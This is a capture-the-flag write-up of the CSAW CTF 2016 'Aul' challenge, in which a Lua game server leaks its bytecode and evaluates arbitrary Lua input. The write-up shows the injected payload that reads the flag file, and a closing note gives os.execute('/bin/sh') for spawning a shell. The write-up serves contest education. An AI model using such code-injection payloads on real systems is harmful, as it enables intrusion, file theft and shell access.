---
title: 'CSAW CTF 2016: Aul (pwn 100)'
tags:
  - Lua
  - pwn
  - CSAW CTF
categories:
  - writeup
date: 2016-09-20 15:31:01
---


## Description

> Wow, this looks like an aul-ful game. I think there is a flag around here somewhere...
> nc pwn.chal.csaw.io 8001

## Exploit

After connecting to the server, it display some sort of game. The interesting thing is that when we type `help`, it will print some binary-like data. 

{% codeblock lang:plain line_number:false %}
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
help
help
LuaS�

xV(w@�,��,�,���,��,�,���,��,�,���CA�$@@C$@�&�
                                              make_boardpopulate_boardboard_tostringfallrotatecrush
                                                                                                   rotate_lefreadAllhelpquitexit	run_stepgame
writelinelet's play a game


K@J��@@��
         AF�@
setmetatable�J��@�f&�size
            __tostringboard_tostring"
                                     .�@���A@�@@$Ab@�����@RA, @��@�F�A���AB���Ad������
@i���A�����h��@d���C�BC���
��g��F�C�ef&�sizemath
F@G@�������d���F��@�&&�mathrandom$/!K�@�@�@A�����BN�@��(B��A�������݁'�BA�A@�������$B�����@A���AA���&�
size| tableinsert |concat
1D
G@�@@��������N��(���@�$B'���&�size
�OCMÂGC�@'��@��&�size            make_board5EN���@�@������������_@@�����������������N����&���������FSG@�@@����������A������΁��N����(B�C�
                       make_boardUg
$G@�@@��������A�A���@�N����(A����'��OA�N����(A�B�G�GB�@@����@����'��&size
                                                                           make_boardabcdik	F@�@�@��ef&�rotatemr
                                                                                                                    F@G@����d���������@��@�&�ioopenrbread*allclosetx@@@F�@��d��$��F@A��@ǀ��d@&�stringsureadAll
                                     server.luac	writerawlen{@@�&�quit�-F@d���@@��@�����@���A�@����@@�@A�������@����@@�@A�������@����B�@���������B@������&�
                                                                                                                                                                   	readlinestringlenexitfind	functionprintloareturn ��%@F@@��d$�F�@�A����@��d@F�A�d���A�@@�_�@���@BƀBAB@$�������@���@���&�
                                                                                                                              populate_board
                                                                                                                                            make_board
writelineboard_tostring
	run_stepquitfallcrushEDidn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.
Didn't understand. Type 'rotate', 'rotate_left', 'exit', or 'help'.
{% endcodeblock %}

According to its first few bytes `Lua`, I suppose it is Lua bytecode. However, when I try to decompile or execute the binary, it seems to be corrupted. [This writeup](https://github.com/ret2libc/ctfs/tree/master/csaw2016/aul) has described how to fix the binary, but during the contest, I just tried entering some function name shown in the binary like `game` and found that the function will be called. Furthermore, I found that it can actually execute arbitrary Lua function like `io.write('hi')`. I then entering `io.write(io.open("flag", "r"):read("*all"))` to read and print the flag.

{% codeblock lang:plain line_number:false %}
let's play a game
| 0 0 0 0 0 0 0 0 |
| 0 1 0 0 0 0 4 0 |
| 0 3 2 2 4 1 4 4 |
| 0 3 2 3 2 3 4 3 |
| 4 b 2 2 4 4 3 4 |
| 3 2 4 4 1 1 2 2 |
| 3 3 c d 3 3 2 3 |
| 3 2 1 4 4 a 2 4 |
io.write(io.open("flag", "r"):read("*all"))
io.write(io.open("flag", "r"):read("*all"))
flag{we_need_a_real_flag_for_this_chal}
{% endcodeblock %}

Yes, I luckily guess the filename `flag`.

> Flag: `flag{we_need_a_real_flag_for_this_chal}`

## Note

Instead of guessing the filename of the flag, using `os.execute("/bin/sh")` can get the shell reliably ([reference](https://galhacktictrendsetters.wordpress.com/2016/09/20/csaw-quals-2016-aul/)).
